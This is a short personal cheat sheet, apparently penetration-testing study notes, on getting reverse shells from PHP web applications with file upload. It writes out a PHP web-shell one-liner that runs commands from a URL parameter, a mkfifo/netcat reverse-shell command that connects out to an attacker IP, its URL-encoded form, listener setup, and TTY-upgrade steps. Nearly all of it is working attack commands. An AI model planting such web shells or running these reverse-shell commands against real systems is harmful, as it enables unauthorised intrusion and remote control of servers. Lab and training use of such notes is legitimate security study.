# web-app revshells
ï·½
* guide to obtaining reverse shells on web applications.
## scenario #1: php server w/ file upload
### obtaining a shell (ie. through a cmd window)
* since this is a PHP server, we can use PHP code and vulns to gain a shell.
* we can use PHP to use the `system()` function
  * this takes the url parameter `cmd` as an input and executes it as a system command.
* use the following one-liner:
  * `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
  * ,which makes a PHP file called `shell.php` that calls the system to open a command prompt.
* This can be accessed by navigating to shell.php, eg. `http://example.com/shell.php?cmd={command-name}`

* Good for easy commands, checking simple stuff. not an entire shell.

#### Getting an interactive shell from this

* Start a `nc` listener on a port, eg.
  * `nc -lvnp 4444`

* Run the command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 4444 >/tmp/f`, where:
  * `10.10.16.11` is the IP, and
  * `4444` is the port (same as the one `nc` is using).

* Remember to URL encode this before running, such that it looks something like this: `rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.11+4444+>/tmp/f`

  > [!WARNING]
  > It won't be this, remember to re-encode it!

* Our `nc` connection should be established!

> [!NOTE]
> that if this does not work, try using burp and its repeater page.

* After the (basic) shell has been acquired, we can get a `TTY` shell by the command:
  * `python3 -c 'import pty;pty.spawn("/bin/bash");'`

we should have a shell ðŸŽ‰
* navigate to post-shell-exploitation.md for extra help gl sa'd ur a goat
##### Fully interactive shell

* Stop the `tty` with `CTRL+Z`

* Run `stty raw -echo`, `fg` to foreground it, and `export TERM=xterm` so we can clear the console.



### Full reverse shell

* Code for this is found in `~/hacking/oscp/exploitation/reverse-shells/php-reverse-shell.php`.

* Make sure to change the `IP` and `port` to your own (the `utun5` one).
* Start a `nc` listener:
  * `nc -lvnp 1234` (or whatever the port is)

